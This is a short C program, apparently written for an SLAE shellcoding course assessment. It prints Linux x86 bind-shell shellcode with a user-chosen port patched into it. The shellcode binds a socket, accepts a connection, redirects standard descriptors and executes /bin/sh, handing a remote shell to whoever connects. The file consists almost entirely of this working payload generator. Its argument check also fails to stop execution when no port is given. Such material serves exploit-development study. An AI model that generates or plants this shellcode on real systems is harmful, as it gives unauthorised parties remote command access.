// File: bind_shell_program.c
// Author: Dave Sully 
// Simple bind shell with configurable port number in C, part of SLAE assessment 1 
// NB: Zero error checking in this script :/


#include<stdio.h>
#include<stdlib.h>
#include<string.h>

// 0x115c

int portnumber;
unsigned char porthigh, portlow;

main(int argc, char** argv)
{
	// Check some thing has been passed in 
	if (argc != 2)
		{
			printf("Port number must be supplied\n");
			printf("Usage: %s \n", argv[0]);
		}
	// Convert Port number to some thing usable 
	portnumber = atoi(argv[1]);
	porthigh = portnumber >> 8 ;
	portlow = (portnumber << 8) >> 8;
	
	// Display our shellcode
	printf("Shellcode Length: 121");
	printf("Bind Port (%05d) \n\n",portnumber);
	printf("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x31\\xff\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\x89\\xca\\x83\\xea\\x01\\xcd\\x80\\x96\\x31\\xd2\\x52\\x66\\x68\\x%02x\\x%02x\\x66\\x6a\\x02\\x66\\xb8\\x69\\x01\\x89\\xf3\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\xb8\\x6b\\x01\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x56\\x31\\xf6\\xcd\\x80\\x5e\\x89\\xc7\\xb0\\x3f\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x49\\xb0\\x3f\\xcd\\x80\\x49\\xb0\\x3f\\xcd\\x80\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80\n\n",porthigh,portlow);

	return 0;

}

	
